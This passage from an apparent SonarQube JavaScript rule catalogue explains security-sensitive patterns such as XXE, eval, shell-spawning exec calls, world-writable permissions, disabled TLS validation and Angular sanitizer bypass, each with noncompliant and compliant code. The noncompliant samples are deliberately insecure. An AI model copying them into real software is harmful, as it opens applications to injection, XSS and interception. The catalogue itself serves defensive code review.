<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
const net = require('net');

var socket = new net.Socket(); // Sensitive
socket.connect(80, 'google.com');

// net.createConnection creates a new net.Socket, initiates connection with socket.connect(), then returns the net.Socket that starts the connection
net.createConnection({ port: port }, () =&gt; {}); // Sensitive

// net.connect is an alias to net.createConnection
net.connect({ port: port }, () =&gt; {}); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption ('Resource Exhaustion')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2755">
              javascript:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in libxmljs</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
var libxmljs = require('libxmljs');
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');
libxmljs.parseXmlString(xml, {
    noblanks: true,
    noent: true, // Noncompliant
    nocdata: true
});
</pre>
<h4>Compliant solution</h4>
<p><code>parseXmlString</code> is safe by default.</p>
<pre data-diff-id="1" data-diff-type="compliant">
var libxmljs = require('libxmljs');
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');
libxmljs.parseXmlString(xml);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1525">
              javascript:S1525
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS4507&rule_key=javascript%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The debugger statement can be placed anywhere in procedures to suspend execution. Using the debugger statement is similar to setting a breakpoint
in the code. By definition such statement must absolutely be removed from the source code to prevent any unexpected behavior or added vulnerability to
attacks in production.</p>
<h3>Noncompliant code example</h3>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
  // Wait for user to resume.
  debugger;
}
</pre>
<h3>Compliant solution</h3>
<pre>
for (i = 1; i&lt;5; i++) {
  // Print i to the Output window.
  Debug.write("loop index is " + i);
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2612">
              javascript:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application is designed to be run on a multi-user environment. </li>
  <li> Corresponding files and directories may contain confidential information. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html"><code>fs</code></a></p>
<pre>
const fs = require('fs');

fs.chmodSync("/tmp/fs", 0o777); // Sensitive
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises;

fsPromises.chmod("/tmp/fsPromises", 0o777); // Sensitive
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle = fsPromises.open('/tmp/fsPromises', 'r');
    filehandle.chmod(0o777); // Sensitive
  } finally {
    if (filehandle !== undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask"><code>process.umask</code></a></p>
<pre>
const process = require('process');

process.umask(0o000); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Node.js <a href="https://nodejs.org/api/fs.html"><code>fs</code></a></p>
<pre>
const fs = require('fs');

fs.chmodSync("/tmp/fs", 0o770); // Compliant
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises;

fsPromises.chmod("/tmp/fsPromises", 0o770); // Compliant
</pre>
<pre>
const fs = require('fs');
const fsPromises = fs.promises

async function fileHandler() {
  let filehandle;
  try {
    filehandle = fsPromises.open('/tmp/fsPromises', 'r');
    filehandle.chmod(0o770); // Compliant
  } finally {
    if (filehandle !== undefined)
      filehandle.close();
  }
}
</pre>
<p>Node.js <a href="https://nodejs.org/api/process.html#process_process_umask_mask"><code>process.umask</code></a></p>
<pre>
const process = require('process');

process.umask(0o007); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission">OWASP File Permission</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1523">
              javascript:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807">CVE-2017-9807</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802">CVE-2017-9802</a> </li>
</ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a
href="https://owasp.org/www-community/attacks/Code_Injection">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule raises issues on calls to <code>eval</code> and <code>Function</code> constructor. This rule does not detect code injections. It only
highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>
<p>The rule also flags string literals starting with <code>javascript:</code> as the code passed in <code>javascript:</code> URLs is evaluated the
same way as calls to <code>eval</code> or <code>Function</code> constructor.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>
  <li> you really need to run code dynamically. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_(computer_security)">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager">Security Managers</a> in java, <a
href="https://www.w3schools.com/tags/att_iframe_sandbox.asp">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
let value = eval('obj.' + propName); // Sensitive
let func = Function('obj' + propName); // Sensitive
location.href = 'javascript:void(0)'; // Sensitive
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue when the argument of the <code>eval</code> or <code>Function</code> is a literal string as it is reasonably
safe.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4721">
              javascript:S4721
            </a>
          </td>
          <td>
            <details>
              <p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> OS command name or parameters are user-controlled. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<pre>
const cp = require('child_process');

// A shell will be spawn in these following cases:
cp.exec(cmd); // Sensitive
cp.execSync(cmd); // Sensitive

cp.spawn(cmd, { shell: true }); // Sensitive
cp.spawnSync(cmd, { shell: true }); // Sensitive
cp.execFile(cmd, { shell: true }); // Sensitive
cp.execFileSync(cmd, { shell: true }); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
const cp = require('child_process');

cp.spawnSync("/usr/bin/file.exe", { shell: false }); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/78">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1313">
              javascript:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901">CVE-2006-5901</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725">CVE-2005-3725</a> </li>
</ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul>
  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>
  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>
</ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul>
  <li> Can give information to an attacker about the network topology. </li>
  <li> It’s a personal (assigned to an identifiable person) IP address. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip = "192.168.12.42"; // Sensitive

const net = require('net');
var client = new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Compliant Solution</h2>
<pre>
ip = process.env.IP_ADDRESS; // Compliant

const net = require('net');
var client = new net.Socket();
client.connect(80, ip, function() {
  // ...
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>
  <li> Broadcast address 255.255.255.255 </li>
  <li> Non routable address 0.0.0.0 </li>
  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm">often match
  Object Identifiers</a> (OID). </li>
  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a
  href="https://datatracker.ietf.org/doc/html/rfc5737">RFC 5737</a> </li>
  <li> Addresses in the 2001:db8::/32 range, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849">RFC
  3849</a> </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4829">
              javascript:S4829
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337">CVE-2005-2337</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
// All uses of process.stdin are security-sensitive and should be reviewed

process.stdin.on('readable', () =&gt; {
	const chunk = process.stdin.read(); // Sensitive
	if (chunk !== null) {
		dosomething(chunk);
	}
});

const readline = require('readline');
readline.createInterface({
	input: process.stdin // Sensitive
}).on('line', (input) =&gt; {
	dosomething(input);
});
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4823">
              javascript:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281">CVE-2018-7281</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326">CVE-2018-12326</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<pre>
// The process object is a global that provides information about, and control over, the current Node.js process
var param = process.argv[2]; // Sensitive: check how the argument is used
console.log('Param: ' + param);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/214">CWE-214 - Information Exposure Through Process Environment</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4830">
              javascript:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.
Certificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>
<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by setting <code>rejectUnauthorized</code> to <code>false</code>. To enable validation set the value to
<code>true</code> or do not set <code>rejectUnauthorized</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  rejectUnauthorized: false,
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
}); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const tls = require('node:tls');

let options = {
    rejectUnauthorized: false,
    secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
}); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const https = require('node:https');

let options = {
  hostname: 'www.example.com',
  port: 443,
  path: '/',
  method: 'GET',
  secureProtocol: 'TLSv1_2_method'
};

let req = https.request(options, (res) =&gt; {
  res.on('data', (d) =&gt; {
    process.stdout.write(d);
  });
});
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const tls = require('node:tls');

let options = {
    secureProtocol: 'TLSv1_2_method'
};

let socket = tls.connect(443, "www.example.com", options, () =&gt; {
  process.stdin.pipe(socket);
  process.stdin.resume();
});
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/295">CWE-295 - Improper Certificate Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S1442">
              javascript:S1442
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=javascript%3AS4507&rule_key=javascript%3AS4507'>S4507</a> instead.</p>
<h2>Why is this an issue?</h2>
<p><code>alert(...)</code> as well as <code>confirm(...)</code> and <code>prompt(...)</code> can be useful for debugging during development, but in
production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed.</p>
<h3>Noncompliant code example</h3>
<pre>
if(unexpectedCondition) {
  alert("Unexpected Condition");
}
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6268">
              javascript:S6268
            </a>
          </td>
          <td>
            <details>
              <p>Angular prevents XSS vulnerabilities by treating all values as untrusted by default. Untrusted values are systematically sanitized by the framework
before they are inserted into the DOM.</p>
<p>Still, developers have the ability to manually mark a value as trusted if they are sure that the value is already sanitized. Accidentally trusting
malicious data will introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive
information or impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The value for which sanitization has been disabled is user-controlled. </li>
  <li> It’s difficult to understand how this value is constructed. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid including dynamic executable code and thus disabling Angular’s built-in sanitization unless it’s absolutely necessary. Try instead to
  rely as much as possible on static templates and Angular built-in sanitization to define web page content. </li>
  <li> Make sure to understand how the value to consider as trusted is constructed and never concatenate it with user-controlled data. </li>
  <li> Make sure to choose the correct <a href="https://angular.io/api/platform-browser/DomSanitizer">DomSanitizer</a> "bypass" method based on the
  context. For instance, only use <code>bypassSecurityTrustUrl</code> to trust urls in an <code>href</code> attribute context. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import { Component, OnInit } from '@angular/core';
import { DomSanitizer, SafeHtml } from "@angular/platform-browser";
import { ActivatedRoute } from '@angular/router';

@Component({
  template: '&lt;div id="hello" [innerHTML]="hello"&gt;&lt;/div&gt;'
})
export class HelloComponent implements OnInit {
  hello: SafeHtml;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    let name = this.route.snapshot.queryParams.name;
    let html = "&lt;h1&gt;Hello " + name + "&lt;/h1&gt;";
    this.hello = this.sanitizer.bypassSecurityTrustHtml(html); // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import { Component, OnInit } from '@angular/core';
import { DomSanitizer } from "@angular/platform-browser";
import { ActivatedRoute } from '@angular/router';

@Component({
  template: '&lt;div id="hello"&gt;&lt;h1&gt;Hello {{name}}&lt;/h1&gt;&lt;/div&gt;',
})
export class HelloComponent implements OnInit {
  name: string;

  constructor(private sanitizer: DomSanitizer, private route: ActivatedRoute) { }

  ngOnInit(): void {
    this.name = this.route.snapshot.queryParams.name;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
  <li> <a href="https://angular.io/guide/security">Angular - Best Practices - Security</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
